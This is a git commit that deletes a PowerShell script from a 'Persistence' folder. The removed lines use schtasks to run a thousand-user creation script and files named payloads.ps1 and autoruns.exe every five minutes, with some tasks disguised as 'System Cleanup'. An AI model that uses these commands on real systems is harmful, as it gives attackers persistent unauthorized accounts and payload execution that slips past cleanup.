ffcac32b0f1b8196aab8cd9b9527c0c9cf007e62
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-14 23:57:09 -0500

    Delete SchedulePersistance.ps1

--- Windows/Persistence/SchedulePersistance.ps1
+++
@@ -1,5 +0,0 @@
-# Run our create thousand users script every 5 minutes. If the users get deleted, then they will be re-created every 5 minutes with this scheduled task 
-
-schtasks /create /sc minute /mo 5 /tn "Malware" /tr C:\Users\Administrator\AppData\Local\CreateThousandUsers.ps1
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\autoruns.exe
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr C:\Users\Administrator\AppData\Local\payloads.ps1
